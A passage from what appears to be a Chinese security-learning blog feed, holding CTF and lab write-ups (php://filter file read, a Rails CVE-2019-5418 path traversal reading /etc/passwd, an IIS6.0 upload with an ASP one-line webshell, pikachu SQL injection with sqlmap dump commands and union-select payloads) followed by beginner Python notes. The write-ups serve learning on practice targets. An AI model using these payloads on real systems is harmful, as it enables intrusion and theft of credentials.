伪协议直接把文件显示出来。</p><pre><code class="hljs">?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>解释：php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。如果不进行 base64 编码传入，index.php 就会直接执行，就看不到文件中的内容了。（博文已贴）</p><p><a href="https://www.cnblogs.com/pursue-security/p/15374168.html" title="php伪协议">https://www.cnblogs.com/pursue-security/p/15374168.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WEB</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ruby On Rails漏洞复现第二题（CVE-2019-5418）</title>
    <link href="/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/"/>
    <url>/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。</p><h1 id="实训目标"><a href="#实训目标" class="headerlink" title="实训目标"></a>实训目标</h1><p>1、学会根据漏洞编号查找漏洞详情；</p><p>2、了解Ruby On Rails（CVE-2019-5418）形成原理；</p><p>3、学习Ruby On Rails（CVE-2019-5418）利用方法；</p><h1 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向"></a>解题方向</h1><p>利用已知漏洞读取文件passwd;</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://s2.loli.net/2022/08/16/JMXnoHVlb8zF4xy.png" alt="image.png"></p><p>先百度查一下CVE-2019-5418漏洞详情：</p><blockquote><p>漏洞描述：由于Rubt on Rails使用了指定参数的render file来渲染应用之外的视图，可以通过修改访问某控制器的请求包，通过“../../../../”来达到路径穿越的目的，然后再通过<code>\{\{</code>(此处是两个左大括号，因为语法问题只能这么写了，下同此原因)来进行模板查询路径的闭合，使得所要访问的文件被当作外部模板来解析。</p><p>影响版本：Rails全版本，其中修复版本：6.0.0.beta3; 5.2.2.1; 5.1.6.2; 5.0.7.2; 4.2.11.1</p></blockquote><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>访问IP：端口/robots，bp抓包</p><ul><li>robots文件：网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，即robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。</li></ul><p><img src="https://s2.loli.net/2022/08/16/idZAkJxQUTznqug.png" alt="image.png"></p><p>修改数据包Accept内容为 <code>../../../../../etc/passwd\{\{</code>,通过路径穿越实现了任意文件读取</p><p><img src="https://s2.loli.net/2022/08/16/f9dTYX3nKCPrkpi.png" alt="image.png"></p><pre><code class="hljs">key: mozhe0b757871236a2e73bad56ff2eb6</code></pre><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1、升级</p><p>2、禁止接受accept任意的type</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>墨者学院</tag>
      
      <tag>任意文件读取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场：内部文件上传系统漏洞分析溯源</title>
    <link href="/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/"/>
    <url>/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可以通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p><p>当系统存在文件上传漏洞时，攻击者可以将病毒、木马、WebShell以及其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利，根据具体漏洞差异，上传的脚本可以是正常后缀的PHP、ASP以及JSP脚本，也可以是串改后缀后的这几类脚本。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://s2.loli.net/2022/08/14/WX6tx1Kej5ZpqhL.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/14/HZT3dXicvLjsDVY.png" alt="image.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>验证上传点是否可直接上传一句话木马</li><li>验证是否存在前端验证</li><li>验证是否开启mime绕过</li><li>验证是否开启文件否检测</li><li>验证是否存在文件解析漏洞验证</li></ul><p>一句话木马</p><p><img src="https://s2.loli.net/2022/08/14/BWPjHVbX1dt4EZk.png" alt="image.png"></p><p>上传失败</p><p>php或asp文件无法上传，但txt、jpg等可以上传</p><p><img src="https://s2.loli.net/2022/08/14/SlGY1gDMq3zHyvN.png" alt="image.png"></p><p>通过F12查看服务，为IIS/6.0</p><p><img src="https://s2.loli.net/2022/08/14/x8AgbWo5nOzI4iT.png" alt="image.png"></p><h2 id="IIS6-0漏洞"><a href="#IIS6-0漏洞" class="headerlink" title="IIS6.0漏洞"></a>IIS6.0漏洞</h2><p>该版本默认将<code>.asp;.jpg</code>此种格式的文件名，当成asp解析，服务器默认不解析;号极其后面的内容，相当于截断。</p><p>例如：上传一个图片文件，名字为“xiao.asp;.jpg”的木马文件，该文件可以被当作asp文件解析并执行。</p><p>IIS除了会将asp解析成脚本执行文件之外，还会将cer sdx asa 扩展名解析成asp。</p><h2 id="构造一句话木马"><a href="#构造一句话木马" class="headerlink" title="构造一句话木马"></a>构造一句话木马</h2><p>当我们上传xxx.asp文件时，该文件以后的子文件都以asp文件来执行。</p><pre><code class="hljs">&lt;% eval request("a") %&gt;</code></pre><p>上传一句话木马的hack.txt文件，并用bp抓包：</p><p><img src="https://s2.loli.net/2022/08/14/u1CvZxBTWojQlUR.png" alt="image.png"></p><p>改成hack.asp，这样服务器读到hack.asp目录时后面都以asp文件执行。</p><p><img src="https://s2.loli.net/2022/08/14/5lFZPXVgAWcmYus.png" alt="image.png"></p><p>最后打开蚁剑，连接其返回地址，找到key即可。</p><p><img src="https://s2.loli.net/2022/08/14/XszVYDNge8LFrT2.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/14/wDFysAPbvq5tGr9.png" alt="image.png"></p><pre><code class="hljs">KEY:mozhe7f5448dfef4b57464d1c37c75bf </code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>（2022.8.14）<br>做题时看大佬的writeup解的，完全不会，一知半解，做完了感觉会了一点，最起码了解了IIS6.0漏洞和文件上传漏洞的测验方式。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>墨者学院</tag>
      
      <tag>文件上传</tag>
      
      <tag>WebShell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu-SQL注入</title>
    <link href="/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p><p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p><p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p><p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" alt="图片.png"></p><p>随便提交，抓包可知，是post方式提交的参数为</p><pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>使用sqlmap跑post方式时的格式为：</p><pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;</code></pre><p>1、使用sqlmap跑数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p>注释：</p><ul><li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li><li>‐‐dbs 当用户有权读取时，列出所有的数据库</li><li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li></ul><p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" alt="图片.png"></p><p>2、查数据库pikachu下的表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch</code></pre><p>注释：</p><ul><li>‐D pikachu 指定数据库pikachu</li><li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li></ul><p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" alt="图片.png"></p><p>3、获取表users中的列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p>注释：</p><ul><li>‐T users 指定表明users</li><li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li><li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" alt="图片.png"></li></ul><p>4、获取列username和password中的字段内容</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p>注释：</p><ul><li>‐C username,password 指定读取列username和password中的字段内容</li><li>‐‐dump 抛出前面指定内容</li></ul><p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" alt="图片.png"></p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p><p>2、提交恒等语句可以查询到所有的数据信息</p><p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" alt="图片.png"></p><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" alt="图片.png"></p><p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" alt="图片.png"></p><p>GET方法取表，抓包：</p><p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" alt="图片.png"></p><p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p><p>使用sqlmap跑：</p><p>1、查数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs </code></pre><p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" alt="图片.png"></p><p>2、查表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" alt="图片.png"></p><p>3、查列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" alt="图片.png"></p><p>4、查字段</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png" alt="图片.png"></p><h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre><code class="hljs">$sql="select * from user where password like '%$pwd%' order by password";</code></pre><p>%匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。</p><p>如果用户端输入: <code>and 1=1 and '%'=</code><br>则会变成：</p><pre><code class="hljs">$sql="select * from user where password like '%fendo'and 1=1 and '%'='%' order by password";</code></pre><p>存在sql注入。<br>题</p><p><img src="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png" alt="图片.png"></p><p>输入一个单引号’</p><p><img src="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png" alt="图片.png"></p><p>报错，因为单引号导致语句%’没闭合。</p><p>输入 <code>'and 1=1 and '%'='</code> ,此时语句变为：</p><pre><code class="hljs">'%' and 1=1 and '%'='%' order by password</code></pre><p><img src="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png" alt="图片.png"></p><p>还可以：</p><ul><li>%’ and 1=1‐‐’</li><li>‘ and 1=1#</li><li>%’ and 1=1 and ‘%’=’</li></ul><p>可输入 <code>' and 1=1 order by x# </code>通过order by x 确定字段数，输入<code>' and 1=1 order by 3#</code>返回正常页面</p><p>输入<code>order by 4#</code>返回报错，说明字段数为3.</p><p>输入 <code>%' and 1=2 union select 1,2,3#</code></p><p><img src="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png" alt="图片.png"></p><p>（1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu</p><p>（2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到<br>pikachu数据库下所有表名。</p><p>（3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名</p><p>（4）输入 %’ and 1=2 union select 1,2,username from pikachu.users#</p><p>(顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7)</p><h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>xx型注入是什么鬼，看到提示笑死</p><p><img src="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png" alt="图片.png"></p><p>随便输入字符抓个包，是GET型请求，输入特殊字符<code>'"&lt;&gt;666</code>,回显报错.</p><p>尝试闭合一下：<code> #'&gt; &lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>哎嗨！成功弹出xss，我真是进步了。</p><p>差点忘记这是sql注入了，输入一下万能恒等式：<code> ' and 1=1 '%'='</code></p><p>回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。</p><p><img src="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png" alt="图片.png"></p><p>应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp<br>吧。</p><p>1、传输方式为get，传输参数为<code> name=a&amp;submit=%E6%9F%A5%E8%AF%A</code></p><p>2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+<br>单引号会报错，初步推测使用单引号使其闭合</p><p>3、利用联合查询：<code> a') union select 1,2#</code></p><p>爆出数据库名字：<code> a') union select database(),2 #</code></p><p>爆出<br>users：<code> a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' #</code></p><p>查</p><p>列：<code> a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p><p>查字段：<code> a') union select 1,concat(username,password) from pikachu.users #</code></p><p><img src="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png" alt="图片.png"></p><h1 id="quot-insert-update-quot-注入"><a href="#quot-insert-update-quot-注入" class="headerlink" title="&quot;insert/update&quot;注入"></a><code>"insert/update"</code>注入</h1>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>pikachu</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习2</title>
    <link href="/2022/08/13/python%E5%AD%A6%E4%B9%A02/"/>
    <url>/2022/08/13/python%E5%AD%A6%E4%B9%A02/</url>
    
    <content type="html"><![CDATA[<h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><p>1、<code>if…else…</code></p><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">money</span>=1000<br><span class="hljs-attribute">s</span>=int(input('请输入取款金额：'))<br><span class="hljs-keyword">if</span> money &gt;=s:<br>    <span class="hljs-attribute">money</span>=money-s<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'取款成功，余额为：'</span>,money)<br></code></pre></td></tr></tbody></table></figure><p>eg: 从键盘输入一个数判断奇偶。</p><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">num</span>=<span class="hljs-built_in">int</span>(input(<span class="hljs-string">"请输入一个数字："</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">num</span>%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">num</span>,<span class="hljs-string">'是偶数'</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">num</span>,<span class="hljs-string">'是奇数'</span>)<br></code></pre></td></tr></tbody></table></figure><p>2、多分支：<code>if…elif…else</code></p><p>eg: 录入成绩：90-100为A,80-89为B,70-79为C,60-69为D,50-59为E,输入小于0或大于100为错误输入。</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">score</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">'请输入你的成绩：'</span>))</span><br><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-number">90</span>&lt;=<span class="hljs-variable">score</span>&lt;=<span class="hljs-number">100</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are A"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">80</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">90</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'you are B'</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">70</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">80</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are C"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">60</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">70</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are D"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">0</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">60</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'you are E'</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'Error!!'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>3、嵌套if</p><p>eg: 购物结算时，会员&gt;=200 打八折，&gt;=100打九折，&lt;100不打折；非会员 &gt;=200 打9.5折，&lt;200 不打折</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">answer=<span class="hljs-built_in">input</span>(<span class="hljs-string">"您是否为会员？y or n： "</span>)<br>money=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">"请输入您的金额："</span>))<br><span class="hljs-keyword">if</span> answer==<span class="hljs-string">'y'</span>:<br>    <span class="hljs-keyword">if</span> money&gt;=<span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打八折，您花费了："</span>,money*<span class="hljs-number">0.8</span>)<br>    <span class="hljs-keyword">elif</span> money&gt;=<span class="hljs-number">100</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打九折，您花费了："</span>,money*<span class="hljs-number">0.9</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"不打折，您花费了："</span>,money)<br><span class="hljs-keyword">elif</span> answer==<span class="hljs-string">'n'</span>:<br>    <span class="hljs-keyword">if</span> money&gt;=<span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打九五折，您花费了："</span>,money*<span class="hljs-number">0.95</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"不打折，您花费了："</span>,money)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"您输入有误！"</span>)<br></code></pre></td></tr></tbody></table></figure><p>条件表达式： x if 判断条件 else y</p><p>eg: 比大小</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">"input a num:"</span>))</span><br><span class="hljs-variable">b</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">'input a num:'</span>))</span><br><span class="hljs-function"><span class="hljs-title">print</span>( <span class="hljs-title">str</span>(<span class="hljs-variable">a</span>)+<span class="hljs-string">'大于等于'</span>+<span class="hljs-title">str</span>(<span class="hljs-variable">b</span>)  <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>&gt;<span class="hljs-variable">b</span> <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-title">str</span>(<span class="hljs-variable">a</span>)+<span class="hljs-string">'小于等于'</span>+<span class="hljs-title">str</span>(<span class="hljs-variable">b</span>))</span><br></code></pre></td></tr></tbody></table></figure><p>pass: 占位符，什么也不做。</p><h1 id="内置函数-range"><a href="#内置函数-range" class="headerlink" title="内置函数 range()"></a>内置函数 range()</h1><ul><li>range(stop) —— 创建（0,stop）之间的整数序列，步长为1</li><li>range(start,stop) —— （start,stop）之间，步长为1</li><li>range(start,stop,step) —— （start,stop）,步长为step</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">r</span>=range(10)<br><span class="hljs-built_in">print</span>(r)<br><span class="hljs-attribute">r</span>=range(1,10)<br><span class="hljs-built_in">print</span>(list(r)) #[1, 2, 3, 4, 5, 6, 7, 8, 9]<br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">in</span> r) # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(9 <span class="hljs-keyword">in</span> r) # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r) #<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(9 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r) #<span class="hljs-literal">False</span><br></code></pre></td></tr></tbody></table></figure><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><p>1、<code>while 条件表达式： 循环体</code></p><p>eg: 计算0到4的累加和</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>&lt;<span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">sum</span>+=<span class="hljs-keyword">a</span><br>    <span class="hljs-keyword">a</span>+=<span class="hljs-number">1</span><br>print(<span class="hljs-string">'和为：'</span>,<span class="hljs-built_in">sum</span>)<br> <span class="hljs-comment"># 10</span><br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span>=<span class="hljs-number">1</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>&lt;<span class="hljs-number">101</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">a</span>%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">sum</span>+=<span class="hljs-keyword">a</span><br>    <span class="hljs-keyword">a</span>+=<span class="hljs-number">1</span><br>print(<span class="hljs-built_in">sum</span>)<br> <span class="hljs-comment">#  2550</span><br></code></pre></td></tr></tbody></table></figure><p>2、<code>for-in循环</code></p><p>依次取值，又称遍历</p><p><code>for 变量 in 可迭代对象：  循环体</code></p><p>在循环体中不需要变量时，可写作‘_’</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-string">'python'</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span><br><span class="hljs-variable">for</span> <span class="hljs-variable">a</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">10</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-variable">a</span>)</span><br><span class="hljs-variable">for</span> <span class="hljs-variable">_</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">5</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span 